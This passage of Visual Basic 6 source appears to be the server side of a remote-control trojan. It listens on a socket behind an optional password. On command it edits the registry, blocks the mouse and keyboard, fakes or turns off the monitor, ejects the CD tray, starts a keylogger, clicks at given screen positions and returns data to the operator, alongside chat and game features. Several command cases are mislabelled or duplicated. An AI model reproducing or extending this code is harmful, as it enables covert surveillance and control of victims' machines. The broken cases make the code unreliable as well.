                StrResult = Reg_FindValues(hKey, Path, KeyPattern) 'Fetch The Search Result
                If Len(StrResult) < MAX_BUFFER_SIZE Then
                    send_data (Chr$(Function_ID) & "T" & "0" & Tmp & StrResult) '"0" Indicates pure data
                Else
                    DiskFile = Sys_dir & "RKSearch.xxx"
                    Kill DiskFile
                    If Left$(Put_File_data(DiskFile, Tmp & StrResult), 4) = "True" Then 'Add ParentPath to The File
                         send_data Chr$(Function_ID) & "T" & "1" & Char_Representation(FileLen(DiskFile)) & DiskFile
                    Else
                         send_data Chr$(Function_ID) & "FError In Storing Results to disk"
                    End If
                End If
            Case 183 'Reserved
            Case 184 'Create Value
                Dim TmpArr() As String, Value As String
                TmpArr = Split(Function_Data, Chr$(0))
                hKey = Mid$(TmpArr(0), 1, 1) Or &H80000000
                Path = Mid$(TmpArr(0), 3, Len(TmpArr(0)) - 3)
                ValName = TmpArr(1)
                Value = TmpArr(2)
                send_data (Chr$(Function_ID) & Reg_CreateValue(hKey, Path, ValName, Value))
            Case 185 'Rename Value
                Dim NewName As String
                TmpArr = Split(Function_Data, Chr$(0))
                hKey = Mid$(TmpArr(0), 1, 1) Or &H80000000
                Path = Mid$(TmpArr(0), 3, Len(TmpArr(0)) - 3)
                ValName = TmpArr(1)
                NewName = TmpArr(2)
                send_data (Chr$(Function_ID) & Reg_RenameValue(hKey, Path, ValName, NewName))
            Case 186 'Modify Value
                TmpArr = Split(Function_Data, Chr$(0))
                hKey = Mid$(TmpArr(0), 1, 1) Or &H80000000
                Path = Mid$(TmpArr(0), 3, Len(TmpArr(0)) - 3)
                ValName = TmpArr(1)
                NewName = TmpArr(2)
                send_data (Chr$(Function_ID) & Reg_ModifyValue(hKey, Path, ValName, NewName))
            Case 187 'Delete Value
                TmpArr = Split(Function_Data, Chr$(0))
                hKey = Mid$(TmpArr(0), 1, 1) Or &H80000000
                Path = Mid$(TmpArr(0), 3, Len(TmpArr(0)) - 3)
                ValName = TmpArr(1)
                send_data (Chr$(Function_ID) & Reg_DeleteValue(hKey, Path, ValName))
            Case 188 'reserved
                
            Case 189 'Internet Manager ,OpenURL
                Shell Win_dir & "explorer.exe " & Function_Data
            Case 190
                Tmp = GetCache(CDate(Function_Data))
                If Len(Tmp) < MAX_BUFFER_SIZE Then
                    send_data (Chr$(Function_ID) & "T" & "0" & Tmp) '"0" Indicates pure data
                Else
                    DiskFile = Sys_dir & "HXHCash.xxx"
                    Kill DiskFile
                    If Left$(Put_File_data(DiskFile, Tmp), 4) = "True" Then 'Add ParentPath to The File
                         send_data Chr$(Function_ID) & "T" & "1" & Char_Representation(FileLen(DiskFile)) & DiskFile
                    Else
                         send_data Chr$(Function_ID) & "FError In Storing Results to disk"
                    End If
                End If
            Case 191
    End Select
End Function
Public Function ChatManagerFunctions(Function_ID As Byte, Function_Data As String)
'Chat Manager Functions
'010xxxxx [01000000 > 01011111][64-95]
Dim Data1 As String, Data2 As String, CustArray() As String
On Error Resume Next
    Select Case Function_ID
           Case 64 'Reserved
           
           Case 65 'Show Message Box
                CustArray = Split(Function_Data, Chr$(0))
                send_data (Chr$(Function_ID) & ChatManager.ShowMsgbox(CustArray(0), Val(CustArray(1)), Val(CustArray(2)), CustArray(3)))
           Case 66 '
           
           Case 67 'Login Text Chat
                Dim ChatType As Integer
                Data1 = Mid$(Function_Data, 2, InStr(1, Function_Data, Chr$(0)) - 2)
                Data2 = Mid$(Function_Data, Len(Data1) + 3)
                ChatType = Val(Left$(Function_Data, 1))
                send_data (Chr$(Function_ID) & LogIntoTextChat(Data1, Data2, ChatType))
           Case 68 'Send Text Data
                'Show The Text
                If TextChatFlag = True Then
                    ProcessTextChatData Function_Data
                Else
                    send_data (Chr$(Function_ID) & "F")
                End If
           Case 69 'Logout Text Chat
                'Call Logout From The TextChat Window
                 LogoutTextChat
           Case 70 'Reserved
           
           Case 71 'Login Sound Chat
                send_data (Chr$(Function_ID) & LoginVoiceChat)
           Case 72 'Send Sound Data
                If ProcessVoiceData(Function_Data) = "F" Then 'Send Error If Error Occured During last Playing
                    send_data (Chr$(Function_ID) & "F")
                End If
           Case 73 'Logout From Voice Chat
                LogoutVoiceChat
                send_data (Chr$(Function_ID) & "T")
           Case 74 'Reserved
           
           Case 75 'Login In Spyer
           
           Case 76 'Send Data
           
           Case 77 'Logout Spyer
           
           Case 78 'Reserved
           
           Case 79 'Login White Board
                send_data (Chr$(Function_ID) & LogIntoWhiteBoard())
           Case 80 'Send Whiteboard Data
                ParseWBCode Function_Data
           Case 81 'Logout Whiteboard
                send_data (Chr$(Function_ID) & LogoutWhiteBoard)
           Case 82 'Reserved
           
           Case 83 'Login Games (By Game ID)
                Dim GameID As Integer
                GameID = Val(Left$(Function_Data, 1))
                Select Case GameID
                       Case 0 'Mine sweeper
                            send_data (Chr$(Function_ID) & LogInMS(Long_Representation(Mid$(Function_Data, 2, 4)), _
                            Long_Representation(Mid$(Function_Data, 6, 4)), _
                            Mid$(Function_Data, 10)))
                End Select
           Case 84 'Send Game Data
                OtherSideShot Val(Function_Data)
           Case 85 'Logout Games
                LogoutMS
                send_data (Chr$(Function_ID) & "T")
           Case 86 'Reserved
           
           Case 87 'Reserved
           
           Case 88 'Advanced Topics
    End Select
End Function
Public Sub DeviceManagerFunctions(Function_ID As Byte, Function_Data As String)
    '96 - 127
     Select Case Function_ID
            Case 96 'Get Hardware info
                send_data (Chr$(Function_ID) & Get_HardwareInfo)
            Case 97 'Eject CD
                EjectCD
                send_data (Chr$(Function_ID))
            Case 98 'Close CD
                CloseCD
                send_data (Chr$(Function_ID))
            Case 99 'Stop Mouse & keyboard
                BlockMouseKeyboard
                send_data (Chr$(Function_ID))
            Case 100 'Allow Mouse & keyboard
                AllowMouseKeyboard
                send_data (Chr$(Function_ID))
            Case 101 'Turn-off Monitor
                MonitorOFF
                send_data (Chr$(Function_ID))
            Case 102 'Turn-On monitor
                MonitorON
                send_data (Chr$(Function_ID))
            Case 103 'Caps on
                CapsON
                send_data (Chr$(Function_ID))
            Case 104 'Caps off
                CapsOFF
                send_data (Chr$(Function_ID))
            Case 105 'Num on
                NumON
                send_data (Chr$(Function_ID))
            Case 106 'Num off
                NumOFF
                send_data (Chr$(Function_ID))
            Case 107 'Get monitor states
                send_data (Chr$(Function_ID) & GetMonitorStates)
            Case 108 'Set monitor state
                send_data (Chr$(Function_ID) & SetMonitorState(Long_Representation(Function_Data)))
            Case 109 'Fake Monitor
                send_data (Chr$(Function_ID) & FakeMonitor)
            Case 110 'Cancel Faking
                CancelFakeMonitor
                send_data (Chr$(Function_ID))
            Case 111 'Return as normal
                StartKeyLogger
                send_data (Chr$(Function_ID))
            Case 112 'Start Key Logger
                StopKeyLogger
                send_data (Chr$(Function_ID))
            Case 112 'Stop Key logger
                send_data (Chr$(Function_ID))
            Case 113 'Reserved
                send_data (Chr$(Function_ID))
            Case 114, 115, 116, 117, 118 'Sound Card Control
               'send_data (Chr$(Function_ID)
                send_data (Chr$(Function_ID) & Snd_initialize(Function_ID, Function_Data))
            Case 119 'Hide pointer
                HideMouse
                send_data (Chr$(Function_ID))
            Case 120 'Show pointer
                ShowMouse
                send_data (Chr$(Function_ID))
            Case 122 'Swap Pointer
                SwapMouse
                send_data (Chr$(Function_ID))
            Case 123 'Return normal
                NormalMouse
                send_data (Chr$(Function_ID))
            Case 124 'Left click at
                Dim cx As Long, cy As Long
                cx = Long_Representation(Mid$(Function_Data, 1, 4))
                cy = Long_Representation(Mid$(Function_Data, 5, 4))
                LClick cx, cy
                send_data (Chr$(Function_ID))
            Case 125 'Right click at
                cx = Long_Representation(Mid$(Function_Data, 1, 4))
                cy = Long_Representation(Mid$(Function_Data, 5, 4))
                RClick cx, cy
                send_data (Chr$(Function_ID))
            Case 125 'reserved
            
            Case 126
            
            Case 127
     End Select
End Sub
Function send_data(Data As String)
        'Data = Compress(Data)
        'If sckserver.State = 7 Then
            sckserver.Ssend Data
        'End If
End Function
Private Sub Form_Terminate()
    Kernel.Timer_stop MatrixTimer
End Sub
Private Sub Rooms_MouseDown(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
'Operate the drag and drop of the main form
  Rooms(Index).MousePointer = 5
  b = X
  C = Y
  a = True
End Sub
Private Sub Rooms_MouseMove(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
    'Operate the drag and drop of the main form
    If a And frm_main.Width < Screen.Width Then
        Me.Move Left + (X - b), Top + (Y - C)
    End If
End Sub
Private Sub Rooms_MouseUp(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
  'Operate the drag and drop of the main form
   a = False
   Rooms(Index).MousePointer = 0
End Sub
Private Sub sckserver_DataArrival(ByVal Data As String)
    Dim Mask As Byte
    Dim Command_Byte As Byte, Command_Data As String
    Command_Byte = Asc(Left$(Data, 1))
    Command_Data = Mid$(Data, 2)
    Mask = 224 '11100000
    Mask = Command_Byte And Mask
    If Left$(Data, 4) = "Pass" Then
        If Mid$(Data, 5) = ReadOptions(PwString) Then
            Server_Activated = True
            send_data ("PC_" & sckserver.GetLocalHostName)
        Else
           'Close The Socket
            send_data "IPas" 'Invalid Password
        End If
    End If
    If Data = "IPas" Then sckserver_SockClose 'Invalid Password
   'Check Activity Of Server
    If Server_Activated = False Then Exit Sub
    Select Case Mask
        Case 0 ' Reserved Section
            'Free 32 Sub Functions
        Case 32 'Connection Commands & Operations
            ConnectionManagerFunctions Command_Byte, Command_Data
        Case 64 'Select The Chat Manager Opeerations
            ChatManagerFunctions Command_Byte, Command_Data
        Case 96 'Select The Device Manager Opeerations
            DeviceManagerFunctions Command_Byte, Command_Data
        Case 128 'Select The File-Browser Operations
            FileBrowserFunctions Command_Byte, Command_Data
        Case 160 'Select The System & Windows & Registry Functions
            WinControlFunction Command_Byte, Command_Data
        Case 192 'Select The Task-Manager Operations
            TaskManagerFunctions Command_Byte, Command_Data
        Case 224 'Reserved Section
            'Free 32 Sub Functions
    End Select
End Sub
Private Sub sckserver_SockClose()
    sckserver.SClose
    sckserver.Create (SOCK_STREAM)
    sckserver.Slisten
    BusyConnection = False
    Server_Activated = False
End Sub
Private Sub sckServer_ConnectionRequest()
        sckserver.Saccept
       'Ask For Password If It Exist
        If Server_Activated = False Then
            If Len(ReadOptions(PwString)) Then
                send_data "Pass"
                Exit Sub
            End If
        End If
        send_data ("PC_" & sckserver.GetLocalHostName)
        Server_Activated = True
End Sub
Private Function TrimPassword() As String
    TrimPassword = Mid$(PWchar, 2, InStr(1, Chr$(0), Separator_Char))
End Function
Private Sub TxtBox_GotFocus(Index As Integer)
    If Index = 0 Then 'Redirect the focus to the input text box
        TxtBox(1).SetFocus
    End If
End Sub
Private Sub TxtBox_KeyPress(Index As Integer, KeyAscii As Integer)
    If Index = 1 Then
        If KeyAscii = 13 Then 'Enter Pressed
            If Len(TxtBox(1)) Then
                ComposeTextChatData TxtBox(1).Text
                TxtBox(1) = ""
            End If
        End If
    End If
End Sub
'''''''''''''''''''''''' << White Board >> '''''''''''''''''''''''''''''
Private Sub WBScreen_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = 1 Then WhiteBoardSRDown Int(X), Int(Y)
End Sub
Private Sub WBScreen_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = 1 Then WhiteBoardSRUP Int(X), Int(Y)
End Sub
Private Sub WBScreen_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = 1 Then WhiteBoardSRMove Int(X), Int(Y)
End Sub
Private Sub WBSelectColor_Click()
    PopupMenu WBColors, , WBSelectColor.Left, WBSelectColor.Top + WBSelectColor.Height
End Sub
Private Sub WBSize_Click(Index As Integer)
    WhiteBoardButtonsClick (Index + 5)
End Sub
Private Sub WBColor_Click(Index As Integer)
    WhiteBoardButtonsClick (Index + WBSize.UBound + 6)
End Sub
Private Sub WhiteBoardButtons_Click(Index As Integer)
    WhiteBoardButtonsClick (Index)
End Sub
Private Sub WhiteBoardButtons_MouseDown(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
    Dim I As Integer
    If Index <> 0 And Index < 4 Then
        For I = 0 To WhiteBoardButtons.UBound
            WhiteBoardButtons(I).BorderStyle = 0
        Next I
    End If
    WhiteBoardButtons(Index).BorderStyle = 1
End Sub
Private Sub WhiteBoardButtons_MouseUp(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Index = 0 Or Index > 3 Then
        WhiteBoardButtons(Index).BorderStyle = 0
    End If
End Sub
'''''''''''''''''''''''' << Mine Sweeper Game >>'''''''''''''''''''''''''''''
Private Sub MSscreen_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    'Redirect To ChatManager
     If Button = 1 Then
        MyRound = True 'This is my round for playing
        MsScreenDown Int(X), Int(Y)
     End If
End Sub
Private Sub MSscreen_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
    'Redirect To ChatManager
     MsScreenMove Int(X), Int(Y)
End Sub
